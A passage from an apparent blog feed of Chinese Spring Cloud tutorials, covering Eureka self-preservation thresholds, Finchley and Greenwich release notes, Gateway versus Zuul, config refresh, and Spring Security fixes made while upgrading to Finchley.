        <content type="html"><![CDATA[<p>其中，可能大家关于自我机制的具体保护逻辑还不是特别清楚，今天栈长就具体分析和实战一下，自我保护机制到底是怎么工作的。</p><p>现在我们把保护机制开启：</p><p><img src="http://img.javastack.cn/20190514114125.png"></p><p>关注右上角的两个重要参数：</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>Renews threshold</td><td>Eureka Server 期望每分钟收到客户端实例的总心跳数</td></tr><tr><td>Renews (last min)</td><td>Eureka Server 最后一分钟收到的总心跳数</td></tr></tbody></table><p>我这里显示的数值如下：</p><pre class="line-numbers language-none"><code class="language-none">Renews threshold6Renews (last min)8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这个 6 和 8 分别是怎么算出来的？</p><p>先来看这两个参数的默认设置，摘自《<a href="https://mp.weixin.qq.com/s/5lUJE_pHZJcvk_gHMhoX2Q">Spring Cloud Eureka 常用配置详解</a>》一文：</p><blockquote><p>eureka.server.renewal-percent-threshold：<br>表示 Eureka Server 开启自我保护的系数，默认：0.85。</p></blockquote><blockquote><p>eureka.instance.lease-renewal-interval-in-seconds：<br>表示 Eureka Client 向 Eureka Server 发送心跳的频率（默认 30 秒），如果在 lease-expiration-duration-in-seconds 指定的时间内未收到心跳，则移除该实例。</p></blockquote><p>这里有 4 个注册实例，保护系数：0.85，心跳频率：30秒（每分钟两次），计算公式如下：</p><pre class="line-numbers language-none"><code class="language-none">Renews threshold &#x3D; 4 * 2 * 0.85 &#x3D; 6.8（取整为：6）Renews (last min) &#x3D; 4 * 2 &#x3D; 8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>现在删除一个配置中心实例测试一下：</p><p><img src="http://img.javastack.cn/20190514113747.png"></p><p>出现警告：</p><blockquote><p>EMERGENCY! EUREKA MAY BE INCORRECTLY CLAIMING INSTANCES ARE UP WHEN THEY’RE NOT. RENEWALS ARE LESSER THAN THRESHOLD AND HENCE THE INSTANCES ARE NOT BEING EXPIRED JUST TO BE SAFE.</p></blockquote><p>说明现在 Eureka Server 已经进行保护模式了，并且我删除的那个实例并不会从注册列表中移除，保护机制生效成功。</p><p>由此可知：Eureka Server 在一分钟内如果没有收到 6 个以上的心跳，即：Renews threshold &gt;&#x3D; Renews (last min)，如果保护机制已开启的情况下，则会开启保护机制。</p><p>为什么移除一个实例后，Renews threshold 还是 6 呢，算出来应该是 5，这是因为 Eureka Server 还没刷新这个值，默认 15 分钟刷新一次，可以通过设计以下值进行调整：</p><blockquote><p>eureka.server.renewal-threshold-update-interval-ms&#x3D;900000</p></blockquote><p>了解了心跳策略和保护机制后，对注册中心的日常维护就会有很多帮助。</p><p>好了，今天的分享就到这里了，建议转发收藏，不再迷路。</p><ul><li>Spring Cloud 配置中心高可用搭建</li><li>Spring Cloud 多版本如何选择</li><li>Spring Cloud 是什么，和 Dubbo 对比</li><li>Spring Cloud 注册中心高可用搭建</li><li>Spring Cloud Eureka 自我保护机制</li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud Finchley 正式发布，包含 4 个重大更新！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20Finchley%20%E6%AD%A3%E5%BC%8F%E5%8F%91%E5%B8%83%EF%BC%8C%E5%8C%85%E5%90%AB%204%20%E4%B8%AA%E9%87%8D%E5%A4%A7%E6%9B%B4%E6%96%B0%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20Finchley%20%E6%AD%A3%E5%BC%8F%E5%8F%91%E5%B8%83%EF%BC%8C%E5%8C%85%E5%90%AB%204%20%E4%B8%AA%E9%87%8D%E5%A4%A7%E6%9B%B4%E6%96%B0%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-6-20/82197726.jpg"></p><p>在 Spring 的官方博客上已经看到 Spring Cloud Finchley 在 06 月 19 日这一天正式发布了，我们在 Maven 中央仓库也看到了最新版的更新。</p><p><img src="http://img.javastack.cn/18-6-20/96626148.jpg"></p><p>Finchley 正式版的发布貌似经历了相当长的时间，果然是闷声发大财，这次的重大发布主要带来了以下 4 项重大更新。</p><h3 id="重大更新"><a href="#重大更新" class="headerlink" title="重大更新"></a>重大更新</h3><h5 id="1、新增-Spring-Cloud-Gateway-组件"><a href="#1、新增-Spring-Cloud-Gateway-组件" class="headerlink" title="1、新增 Spring Cloud Gateway 组件"></a>1、新增 Spring Cloud Gateway 组件</h5><p>Spring Cloud Gateway 是一个基于 Spring Webflux 和响应式 Netty 的下一代 API 网关，用来替换 Spring Cloud Netflix Zuul。它提供了更加简单的动态路由，以及针对每个路由的过滤器（如地址重写、断路器、添加&#x2F;删除请求头、限流和安全等）。</p><h5 id="2、新增-Spring-Cloud-Function-组件"><a href="#2、新增-Spring-Cloud-Function-组件" class="headerlink" title="2、新增 Spring Cloud Function 组件"></a>2、新增 Spring Cloud Function 组件</h5><p><strong>Spring Cloud Function 的主要功能如下：</strong></p><ul><li>通过一系列函数推进业务逻辑的实现；</li><li>将业务逻辑的开发生命周期从任何特定运行目标中分离，以便相同的代码可以作为一个 Web 端点、一个流处理器或一个任务来运行；</li><li>支持一个跨 serverless providers 的统一编程模型，并拥有独立运行的能力（本地或 PaaS 平台）；</li><li>支持在 serverless providers 上面启用 Spring Boot 特性，如自动配置、依赖注入、指标等；</li></ul><h5 id="3、兼容-Spring-Boot-2-0-x"><a href="#3、兼容-Spring-Boot-2-0-x" class="headerlink" title="3、兼容 Spring Boot 2.0.x"></a>3、兼容 Spring Boot 2.0.x</h5><p>Finchley 版本是基于 Spring Boot 2.0.x 构建的，官方建议不要与 Spring Boot 1.5.x 及之前的版本一起工作。</p><h5 id="4、最低支持-JDK-1-8"><a href="#4、最低支持-JDK-1-8" class="headerlink" title="4、最低支持 JDK 1.8"></a>4、最低支持 JDK 1.8</h5><p>JDK 门槛提高了，1.8 毕竟是现在的主流。</p><p>更多其他的更新细节请参考 Spring 的官方博客。</p><blockquote><p><a href="https://spring.io/blog/2018/06/19/spring-cloud-finchley-release-is-available%EF%BC%89">https://spring.io/blog/2018/06/19/spring-cloud-finchley-release-is-available）</a></p></blockquote><h3 id="其他版本生命周期"><a href="#其他版本生命周期" class="headerlink" title="其他版本生命周期"></a>其他版本生命周期</h3><p>新版本的发布预示着其他历史版本逐渐退出历史舞台，Spring 官方公布了其他版本的结束服务的截止时间。</p><ul><li><strong>Camden</strong></li></ul><p>现在开始结束生命周期。</p><ul><li><strong>Dalston</strong></li></ul><p>将于 2018 年 12 月结束生命周期。</p><ul><li><strong>Edgware</strong></li></ul><p>伴随着 Spring Boot 1.5.x 的结束而结束生命周期。</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>如果分不清这些版本的意义，请阅读我之前的一篇文章《<a href="https://mp.weixin.qq.com/s/IqlHFsIrFJ5vBG9-1gldJw">Spring Cloud 多版本怎么选择？帮你解惑！</a>》，更多 Spring Cloud 的技术文章请查看公众号专题菜单中 Spring 技术教程汇总。</p><p><strong>@码农们 你们现在用的什么版本，对于升级这个版本有什么看法？欢迎留言！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud Gateway VS Zuul 比较，怎么选择？</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20Gateway%20VS%20Zuul%20%E6%AF%94%E8%BE%83%EF%BC%8C%E6%80%8E%E4%B9%88%E9%80%89%E6%8B%A9%EF%BC%9F/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20Gateway%20VS%20Zuul%20%E6%AF%94%E8%BE%83%EF%BC%8C%E6%80%8E%E4%B9%88%E9%80%89%E6%8B%A9%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>Spring Cloud Gateway 是 <a href="https://mp.weixin.qq.com/s/3MmPgia6ghxwfj2Xcm6tyg">Spring Cloud Finchley</a> 版推出来的新组件，用来代替服务网关：Zuul。</p><p>那 Spring Cloud Gateway 和 Zuul 都有哪些区别呢，咱们来比较一下。</p><p><strong>1、开源组织</strong></p><p>Spring Cloud Gateway 是 Spring Cloud 微服务平台的一个子项目，属于 Spring 开源社区，依赖名叫：spring-cloud-starter-gateway。</p><blockquote><p><a href="https://spring.io/projects/spring-cloud-gateway">https://spring.io/projects/spring-cloud-gateway</a></p></blockquote><p>Zuul 是 Netflix 公司的开源项目，Spring Cloud 在 Netflix 项目中也已经集成了 Zuul，依赖名叫：spring-cloud-starter-netflix-zuul。</p><blockquote><p><a href="https://github.com/Netflix/zuul">https://github.com/Netflix/zuul</a></p></blockquote><p><strong>2、底层实现</strong></p><blockquote><p><a href="https://stackoverflow.com/questions/47092048/how-is-spring-cloud-gateway-different-from-zuul">https://stackoverflow.com/questions/47092048/how-is-spring-cloud-gateway-different-from-zuul</a></p></blockquote><p>据 Spring Cloud Gateway 原作者的解释：</p><p>Zuul构建于 Servlet 2.5，兼容 3.x，使用的是阻塞式的 API，不支持长连接，比如 websockets。另外</p><p>Spring Cloud Gateway构建于 Spring 5+，基于 Spring Boot 2.x 响应式的、非阻塞式的 API。同时，它支持 websockets，和 Spring 框架紧密集成，开发体验相对来说十分不错。</p><p><strong>3、性能表现</strong></p><p>这个没什么好比的，要比就和 Zuul 2.x 比，Zuul 2.x 在底层上有了很大的改变，使用了异步无阻塞式的 API，性能改善明显，不过现在 Spring Cloud 也没集成 Zuul 2.x，所以就没什么好比的。</p><p><strong>如何选择？</strong></p><p>本文说的 Zuul 指 Zuul 1.x，Netflix 早就发布了最新的 Zuul 2.x，但 Spring Cloud 貌似没有整合计划，栈长看了下目前最新的包，整合的还是 Zuul 1.x。</p><p>据了解，正是因为 Zuul 2.x 的不断跳票，Spring Cloud 才釜底抽薪推出了自己的服务网关：Spring Cloud Gateway，栈长看了下，使用起来比 Zuul 更简单，配置更方便，所以说选 Spring Cloud Gateway 没错，毕竟是 Spring Cloud 亲儿子，不会始乱终弃。</p><ul><li>Spring Cloud 最新 Finchley 版本踩坑</li><li>Spring Cloud 多版本如何选择</li><li>Spring Cloud 是什么，和 Dubbo 对比</li><li>Spring Cloud 注册中心高可用搭建</li><li>Spring Cloud Eureka 自我保护机制</li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud Greenwich 正式发布，Hystrix 即将寿终正寝。。</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20Greenwich%20%E6%AD%A3%E5%BC%8F%E5%8F%91%E5%B8%83%EF%BC%8CHystrix%20%E5%8D%B3%E5%B0%86%E5%AF%BF%E7%BB%88%E6%AD%A3%E5%AF%9D%E3%80%82%E3%80%82/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20Greenwich%20%E6%AD%A3%E5%BC%8F%E5%8F%91%E5%B8%83%EF%BC%8CHystrix%20%E5%8D%B3%E5%B0%86%E5%AF%BF%E7%BB%88%E6%AD%A3%E5%AF%9D%E3%80%82%E3%80%82/</url>
      
        <content type="html"><![CDATA[<p>Spring Cloud Greenwich 正式版在 01&#x2F;23&#x2F;2019 这天正式发布了，下面我们来看下有哪些更新内容。</p><h2 id="生命周期终止提醒"><a href="#生命周期终止提醒" class="headerlink" title="生命周期终止提醒"></a>生命周期终止提醒</h2><h4 id="Spring-Cloud-Edgware"><a href="#Spring-Cloud-Edgware" class="headerlink" title="Spring Cloud Edgware"></a>Spring Cloud Edgware</h4><p>Edgware 版本将于 08&#x2F;01&#x2F;2019 正式退役，具体可以参考官方宣布：</p><blockquote><p><a href="https://spring.io/blog/2018/07/30/spring-cloud-edgware-eol-aug-1st-2019">https://spring.io/blog/2018/07/30/spring-cloud-edgware-eol-aug-1st-2019</a></p></blockquote><h4 id="Spring-Cloud-Finchley"><a href="#Spring-Cloud-Finchley" class="headerlink" title="Spring Cloud Finchley"></a>Spring Cloud Finchley</h4><p>Finchley 版本作为 Spring Boot 2.0.x 的主要版本，Finchley 的生命周期也会由 Spring Boot 2.0.x 版本的终止而终止。</p><h4 id="Spring-Cloud-Greenwich"><a href="#Spring-Cloud-Greenwich" class="headerlink" title="Spring Cloud Greenwich"></a>Spring Cloud Greenwich</h4><p>Greenwich 版本现在作为一个次要版本，它后续将继续支持 Spring Boot 2.x 的发布支持。</p><p>分不清这些版本的区别和意义？可以参考栈长之前写的关于版本的文章：<br><a href="https://mp.weixin.qq.com/s/IqlHFsIrFJ5vBG9-1gldJw">Spring Cloud 多版本怎么选择？</a>。</p><h2 id="Greenwich-重大更新"><a href="#Greenwich-重大更新" class="headerlink" title="Greenwich 重大更新"></a>Greenwich 重大更新</h2><h4 id="兼容JDK"><a href="#兼容JDK" class="headerlink" title="兼容JDK"></a>兼容JDK</h4><p>这个最新版本的发布最重要的一点是，所有的子项目都兼容 Java 11。</p><h4 id="新项目"><a href="#新项目" class="headerlink" title="新项目"></a>新项目</h4><p><strong>1、Spring Cloud GCP</strong></p><p>提供对 Google Cloud Platform 的集成。</p><p><strong>2、Spring Cloud Kubernetes</strong></p><p>提供对 Kubernetes 的集成。</p><h4 id="Spring-Cloud-Netflix-进入维护模式"><a href="#Spring-Cloud-Netflix-进入维护模式" class="headerlink" title="Spring Cloud Netflix 进入维护模式"></a>Spring Cloud Netflix 进入维护模式</h4><p>最近，Netflix 宣布 Netflix 进入维护模式：《<a href="https://mp.weixin.qq.com/s/WPb8yUYPyvDCKJVb--W63Q">Hystrix 停止开发。。。Spring Cloud 何去何从？</a>》，Ribbon 自 2016 年以来也一直处于类似的状态，尽管它们已经进入维护模式，但它们在 Netflix 内部已经大规则部署应用。</p><p>另外，Hystrix Dashboard 和 Turbine 已经被 Atlas 取代，这两个项目最后一次的代码提交分别是 2 年前和 4 年前了。Zuul 1 和 Archaius 1 也已经被后续的版本取代，不再向后续版本兼容。</p><p>以下 Spring Cloud Netflix 模块及相应启动器将进入维护模式：</p><ul><li>spring-cloud-netflix-archaius</li><li>spring-cloud-netflix-hystrix-contract</li><li>spring-cloud-netflix-hystrix-dashboard</li><li>spring-cloud-netflix-hystrix-stream</li><li>spring-cloud-netflix-hystrix</li><li>spring-cloud-netflix-ribbon</li><li>spring-cloud-netflix-turbine-stream</li><li>spring-cloud-netflix-turbine</li><li>spring-cloud-netflix-zuul</li></ul><p>这些并不包括 Eureka 或者 concurrency-limits 模块。</p><p><strong>什么是维护模式？</strong></p><p>这些个项目进入维护模式后，Spring Cloud 团队也不会往这些模块添加新功能了，但是还是会修复一些 bug 及安全漏洞，也会考虑和审查来自社区的小规模拉取请求。</p><p>Spring Cloud Greenwich 版本在这些维护模式的项目上至少会支持 1 年。</p><p><strong>有什么替换方案？</strong></p><p>官方推荐了以下替代方案，也许在不久的将来，或者下一个大版本这些替代方案会成为主流项目。</p><table><thead><tr><th>目前的</th><th>可替换</th></tr></thead><tbody><tr><td>Hystrix</td><td>Resilience4j</td></tr><tr><td>Hystrix Dashboard &#x2F; Turbine</td><td>Micrometer + Monitoring System</td></tr><tr><td>Ribbon</td><td>Spring Cloud Loadbalancer</td></tr><tr><td>Zuul 1</td><td>Spring Cloud Gateway</td></tr><tr><td>Archaius 1</td><td>Spring Boot external config + Spring Cloud Config</td></tr></tbody></table><p>这个版本除了以上重大更新，还有一些子项目的版本更新、问题修复等，这里就不详细分析了，大家有兴趣的可以去看官方发布博文：</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud Greenwich.SR4 发布了，跟不上了……</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20Greenwich.SR4%20%E5%8F%91%E5%B8%83%E4%BA%86%EF%BC%8C%E8%B7%9F%E4%B8%8D%E4%B8%8A%E4%BA%86%E2%80%A6%E2%80%A6/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20Greenwich.SR4%20%E5%8F%91%E5%B8%83%E4%BA%86%EF%BC%8C%E8%B7%9F%E4%B8%8D%E4%B8%8A%E4%BA%86%E2%80%A6%E2%80%A6/</url>
      
        <content type="html"><![CDATA[<p>前几天 Spring Cloud Greenwich.SR4 发布了：</p><blockquote><p><a href="https://spring.io/blog/2019/11/19/spring-cloud-greenwich-sr4-released">https://spring.io/blog/2019/11/19/spring-cloud-greenwich-sr4-released</a></p></blockquote><p>我们来看下都更新了什么。</p><p>在 Maven 仓库中已经可以用了：</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependencyManagement&gt;    &lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;            &lt;artifactId&gt;spring-cloud-dependencies&lt;&#x2F;artifactId&gt;            &lt;version&gt;Greenwich.SR4&lt;&#x2F;version&gt;            &lt;type&gt;pom&lt;&#x2F;type&gt;            &lt;scope&gt;import&lt;&#x2F;scope&gt;        &lt;&#x2F;dependency&gt;    &lt;&#x2F;dependencies&gt;&lt;&#x2F;dependencyManagement&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1、Spring-Boot"><a href="#1、Spring-Boot" class="headerlink" title="1、Spring Boot"></a>1、Spring Boot</h4><p>Spring Cloud Greenwich.SR4 是基于 Spring Boot 2.1.10.RELEASE 构建的，Spring Boot 版本越来越高了。</p><h4 id="2、Spring-Cloud-Openfeign"><a href="#2、Spring-Cloud-Openfeign" class="headerlink" title="2、Spring Cloud Openfeign"></a>2、Spring Cloud Openfeign</h4><p>Spring Cloud Openfeign 的版本升级到了 OpenFeign 10.4.0。</p><h4 id="3、Spring-Cloud-Vault"><a href="#3、Spring-Cloud-Vault" class="headerlink" title="3、Spring Cloud Vault"></a>3、Spring Cloud Vault</h4><p>Spring Cloud Vault 的依赖和文档变更和更新。</p><h4 id="4、Spring-Cloud-Gateway"><a href="#4、Spring-Cloud-Gateway" class="headerlink" title="4、Spring Cloud Gateway"></a>4、Spring Cloud Gateway</h4><p>Spring Cloud Gateway 增加了对 Spring Cloud LoadBalancer 的支持。</p><h4 id="5、还有其他模块的-bug-修复"><a href="#5、还有其他模块的-bug-修复" class="headerlink" title="5、还有其他模块的 bug 修复"></a>5、还有其他模块的 bug 修复</h4><ul><li>Spring Cloud Kubernetes</li><li>Spring Cloud Commons</li><li>Spring Cloud Openfeign</li><li>Spring Cloud Contract</li><li>Spring Cloud Vault</li><li>Spring Cloud Netflix</li><li>Spring Cloud Sleuth</li><li>Spring Cloud Config</li><li>Spring Cloud Gateway</li></ul><p>升级推荐阅读：</p><ul><li><a href="https://mp.weixin.qq.com/s/76vRZseVvKJaBPGxIIIn5g">Spring Cloud 升级最新 Greenwich 版本</a></li><li><a href="https://mp.weixin.qq.com/s/CvAmV4mjWHqNPkUoy0CwYw">Spring Cloud 升级最新 Finchley 版本</a></li></ul><p>@ All 码农们：你们升级了吗？有遇到什么样的坑？欢迎留言！</p><ul><li>Spring Cloud 配置中心高可用搭建</li><li>Spring Cloud 多版本如何选择</li><li>Spring Cloud 是什么，和 Dubbo 对比</li><li>Spring Cloud 注册中心高可用搭建</li><li>Spring Cloud Eureka 自我保护机制</li><li>……</li></ul><p><img src="http://img.javastack.cn/wx_search_javastack.png"></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud 动态刷新配置信息</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E5%8A%A8%E6%80%81%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E5%8A%A8%E6%80%81%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<p>有时候在配置中心有些参数是需要修改的，这时候如何不重启而达到实时生效的效果呢？</p><h2 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h2><pre class="line-numbers language-none"><code class="language-none">&lt;dependencies&gt;    ...&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-boot-starter-actuator&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;...&lt;&#x2F;dependencies&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>spring-boot-starter-actuator</code>：这个模块的&#x2F;refresh(POST请求)端点可以刷新配置，更多的使用参考Spring Boot系列文章。</p><h2 id="生效前提"><a href="#生效前提" class="headerlink" title="生效前提"></a>生效前提</h2><p>在需要刷新的Bean上添加@RefreshScope注解。</p><pre class="line-numbers language-none"><code class="language-none">@RefreshScope@RestControllerpublic class TestController &#123;@Value(&quot;$&#123;username&#125;&quot;)private String username;...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当配置更改时，标有@RefreshScope的Bean将得到特殊处理来生效配置。</p><h2 id="扩展问题"><a href="#扩展问题" class="headerlink" title="扩展问题"></a>扩展问题</h2><p>如果项目少配置少的情况可以通过&#x2F;refresh来手动刷新配置，如果项目比较复杂的情况呢这种肯定是行不通的，Spring Cloud Bus消息总线可以解决配置修改的真正的动态刷新。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud 升级最新 Finchley 版本，踩了所有的坑！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E5%8D%87%E7%BA%A7%E6%9C%80%E6%96%B0%20Finchley%20%E7%89%88%E6%9C%AC%EF%BC%8C%E8%B8%A9%E4%BA%86%E6%89%80%E6%9C%89%E7%9A%84%E5%9D%91%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E5%8D%87%E7%BA%A7%E6%9C%80%E6%96%B0%20Finchley%20%E7%89%88%E6%9C%AC%EF%BC%8C%E8%B8%A9%E4%BA%86%E6%89%80%E6%9C%89%E7%9A%84%E5%9D%91%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>Spring Boot 2.x 已经发布了很久，现在 Spring Cloud 也发布了 基于 Spring Boot 2.x 的 Finchley 版本，现在一起为项目做一次整体框架升级。</p><p><strong>升级前 &#x3D;&gt; 升级后</strong></p><p>Spring Boot 1.5.x &#x3D;&gt; Spring Boot 2.0.2</p><p>Spring Cloud Edgware SR4 &#x3D;&gt; Spring Cloud Finchley.RELEASE</p><h3 id="Eureka-Server"><a href="#Eureka-Server" class="headerlink" title="Eureka Server"></a>Eureka Server</h3><p><strong>Eureka Server 依赖更新</strong></p><p>升级前：</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-cloud-starter-eureka-server&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>升级后：</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Eureka-Client"><a href="#Eureka-Client" class="headerlink" title="Eureka Client"></a>Eureka Client</h3><p>因为配置中心需要作为服务注册到注册中心，所以需要升级 Eureka Client，其他依赖没有变动。</p><p><strong>Eureka Client 依赖更新</strong></p><p>升级前：</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-cloud-starter-eureka&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>升级后：</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Spring-Cloud"><a href="#Spring-Cloud" class="headerlink" title="Spring Cloud"></a>Spring Cloud</h3><p><strong>注册中心里面的客户端实例IP显示不正确</strong></p><p>因为 Spring Cloud 获取服务客户端 IP 地址配置变更了。</p><p>升级前：</p><pre class="line-numbers language-none"><code class="language-none">$&#123;spring.cloud.client.ipAddress&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>升级后：</p><pre class="line-numbers language-none"><code class="language-none">$&#123;spring.cloud.client.ip-address&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Spring-Security"><a href="#Spring-Security" class="headerlink" title="Spring Security"></a>Spring Security</h3><p>一般注册中心、配置中心都会使用安全加密，就会依赖 <code>spring-boot-starter-security</code> 组件，升级后有几下两个问题。</p><p><strong>1、用户名和密码无法登录</strong></p><p>因为 Spring Security 的参数进行了变更。</p><p>升级前：</p><pre class="line-numbers language-none"><code class="language-none">security:  user:    name:    password:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>升级后：</p><pre class="line-numbers language-none"><code class="language-none">spring:  security:     user:       name:        password:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2、注册中心没有注册实例</strong></p><p>如图所示，没有注册实例，两个注册中心无法互相注册。</p><p><img src="http://qianniu.javastack.cn/18-8-1/42415130.jpg"></p><p>因为 Spring Security 默认开启了所有 CSRF 攻击防御，需要禁用 &#x2F;eureka 的防御。</p><p>在 Application 入口类增加忽略配置：</p><pre class="line-numbers language-none"><code class="language-none">@EnableWebSecuritystatic class WebSecurityConfig extends WebSecurityConfigurerAdapter &#123;@Overrideprotected void configure(HttpSecurity http) throws Exception &#123;http.csrf().ignoringAntMatchers(&quot;&#x2F;eureka&#x2F;**&quot;);super.configure(http);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3、配置中心无法加解密</strong></p><p>升级后发现访问配置中心无法读取到配置，也无法加解密配置信息，访问配置中心链接直接跳转到了登录页面。</p><p><img src="http://qianniu.javastack.cn/18-8-3/35230831.jpg"></p><p>现在想变回之前的 basic auth 认证方式，找源码发现是自动配置跳到了登录页面，现在重写一下。</p><blockquote><p>自动配置源码：<br>org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter#configure(org.springframework.security.config.annotation.web.builders.HttpSecurity)</p></blockquote><pre class="line-numbers language-none"><code class="language-none">protected void configure(HttpSecurity http) throws Exception &#123;logger.debug(&quot;Using default configure(HttpSecurity). If subclassed this will potentially override subclass configure(HttpSecurity).&quot;);http.authorizeRequests().anyRequest().authenticated().and().formLogin().and().httpBasic();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重写之后：</p><pre class="line-numbers language-none"><code class="language-none">@EnableWebSecuritystatic class WebSecurityConfig extends WebSecurityConfigurerAdapter &#123;@Overrideprotected void configure(HttpSecurity http) throws Exception &#123;http.csrf().ignoringAntMatchers(&quot;&#x2F;**&quot;).and().authorizeRequests().anyRequest().authenticated().and().httpBasic();&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实就是把 <code>formLogin()</code> 干掉了，又回到之前的 basic auth 认证方式，如下图所示。</p><p><img src="http://qianniu.javastack.cn/18-8-3/81574886.jpg"></p><p>现在我们又可以使用以下命令加解密了。</p><blockquote><p>如解密：<br>curl <a 